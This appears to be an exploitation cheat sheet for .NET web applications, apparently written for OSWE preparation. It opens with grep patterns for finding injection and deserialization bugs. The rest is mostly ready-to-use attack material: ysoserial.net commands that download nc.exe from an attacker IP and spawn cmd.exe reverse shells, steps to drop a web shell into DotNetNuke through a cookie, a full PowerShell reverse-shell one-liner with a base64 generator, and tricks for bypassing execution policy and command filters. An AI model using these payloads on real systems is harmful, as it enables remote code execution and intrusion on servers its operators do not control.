    Important Files:  Web.config (settings, etc.)
    User-Supplied Data:  System.Web.HttpRequest class
        egrep -iR 'System.Web.HttpRequest|request\.query|querystring|params|\.value' .
    Session Interaction:  Session array or Profile object or System.Web.SessionState.HttpSessionState class
    File Interaction:  System.IO.File, System.IO.FileStream, System.IO.StreamReader, System.IO.StreamWriter
        egrep -R 'File\.|FileStream|StreamReader|StreamWriter' .
    Dangerous Functions:  https://github.com/rinku191/OSWE-prepration/wiki/C%23-Dangerous-Function
    SQLI Vulnerable Functions:  
        egrep -iR 'SqlCommand|SqlDataAdapter|OleDbCommand|OdbcCommand|SqlCeCommand' .
        egrep -iR '\.Execute' .
    OS Commands:  
        egrep -iR 'Start\.Process|Process\.Start|Proc.*Start|start\(' .
        ^.*?process.*?start.*?\+.*?
        Example injection: Process.Start(user_input + "calc.exe") -- either \\attackerip\pwn\  OR  "mal.exe" + '\00'
    XSS: egrep -iR 'Response.Write\(' .
    XXE: egrep -iR 'xmldocument|xpathnavigator|xmltextreader' .
    Troubleshooting:
        Modify (Debugging): right click 'Program' -> edit class
            ex. Console.WriteLine("Variable Value: " + str + "\r\n");
            Save: 'Compile'; then: File > Save All to overwrite
    Deserialization:
        Search for 'deserial' - look for user functions that call Deserialize within a library
            or: 'TypeNameHandling|JavaScriptTypeResolver|BinaryFormatter|XmlSerializer|Serial'
            ((JavaScript|Xml|(Net)*DataContract)Serializer|(Binary|ObjectState|Los|Soap|Client|Server)Formatter|Json.Net|YamlDotNet|FastJson|Xaml|TypeNameHandling|SimpleTypeResolver|(Serialization|Deerialize|UnsafeDeserialize)|(ComponentModel.Activity|Load|Activity.Load)|ResourceReader|(ProxyObject|DecodeSerializedObject|DecodeValue)|ServiceStack.Text)
        Needs IRunnable class without IDeserializationCallback; 'formatter'; TypeNameHandling; JavaScriptTypeResolver
        Look for if Xml/BinarySerializer instance is created based on a changeable property - without validating that object type
            XMLSerializer is more limited - can only serialize public properties, narrow set of known objects, etc.
        Payloads:  ysoserial.net
            **Try different gadgets!!
            #Detect Ping:  sudo tcpdump -i tun0 'icmp and host <tgt ip>'
            #Check documentation for Gadget<>Formatter mappings
            ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64
            ysoserial.exe -p DotNetNuke -m run_command -c "ping -n 3 192.168.119.141"
            ysoserial.exe -p DotNetNuke -m run_command -c calc.exe
            ysoserial.exe -p DotNetNuke -m read_file -f win.ini
            ysoserial.exe -p DotNetNuke -m run_command -c "powershell.exe..."
            ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBF....." -o base64
            ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping 10.10.14.10" -o base64
            ysoserial.exe -g WindowsIdentity -f Json.Net -c "net use \\10.10.14.10\share /u:dummy dummy & \\10.10.14.10\share\nc64.exe -e cmd.exe 10.10.14.10 443" -o base64
            ysoserial.exe -f Json.Net -g ObjectDataProvider -c "certutil.exe -urlcache -split -f http://10.10.14.81/nc.exe C:/Windows/System32/spool/drivers/color/nc.exe" -o base64
                ysoserial.exe -f Json.Net -g ObjectDataProvider -c "C:/Windows/System32/spool/drivers/color/nc.exe 10.10.14.81 9001 -e cmd.exe" -o base64 
            #Optional - Test locally with '--test'
        Manual Payloads
            look for native methods/functions to serialize - ex. PullFile/WriteFile methods from FileSystemUtils() class
                But not for XmlSerializer - it can't serialize class methods. It can only serialize public properties and fields. - would need a property that triggers a method
            Payload Creation: compile with Visual Studio, then execute to print payload
                For any classes you're using - add their files as references (ex. DotNetNuke.dll and PresentationFramework.dll)
            ex. ObjectDataProvider Deserialization Gadget->MethodName & MethodParameters properties - from C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll (from 'using System.Windows.Data;')
                Step 1: Test that the final payload works (ex. class can download a file from you) - compile and run ODPfiledownloadtest.cs, hosting myODPTest.txt
                    add breakpoints to debug; ensure Burp intercept is off
                Step 2: Serialize/deserialize it and confirm still working - ODPfdtSerializeNotWork.cs - doesn't work for DotNetNuke vulnerability due to type check
            *ex. ExpandedWrapper ODP workaround - allows creation of objects of arbitrary types (from 'using System.Data.Services.Internal;')
                Use this class to wrap our source object (ObjectDataProvider) into a new object type and provide the properties we need (ObjectDataProvider.MethodName and ObjectDataProvider.MethodParameters). This set of information is assigned to the ExpandedWrapper instance properties, which will allow them to be serialized by the XmlSerializer. 
                    ExpWrapSerializerTest.cs (testing and payload creation) and ExpWrapDeserializerTest.cs (exploitation testing)
                    Web Shell: cmdasp.aspx - write to: C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx - send as DNNPersonalization cookie
                    Use encoded Powershell reverse shell - ExpWrapWebshell.cs
    Reverse Shell Example (PowerShell):
        $client = New-Object System.Net.Sockets.TCPClient('192.168.119.140',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
        Then convert it to base64:  iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
        Run:  powershell.exe [-noprofile -noninteractive -ExecutionPolicy bypass -window hidden] -EncodedCommand JABjAGwAaQ...
            Shorter: -nop -noni -ep bypass -w hidden -enc ...
            Filter bypass: -EncodedCommand  ->  -eNco  OR  -^e^C^
    Encoded Powershell Reverse Shell Generator:
        python -c $'import base64; IP = "10.10.10.19"; PORT = "7878"; payload = \'$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\' % (IP, int(PORT)); print("powershell -e " + base64.b64encode(payload.encode("utf16")[2:]).decode());'
        powershell -e ...
    Cmd.exe obfuscation:  cmd.exe /c P^o^w^e^r^S^h^e^l^l^.^e^x^e^ -No^Ex""it -Ex^ec By^pa""ss -^EC YwBhAG^wAYwA=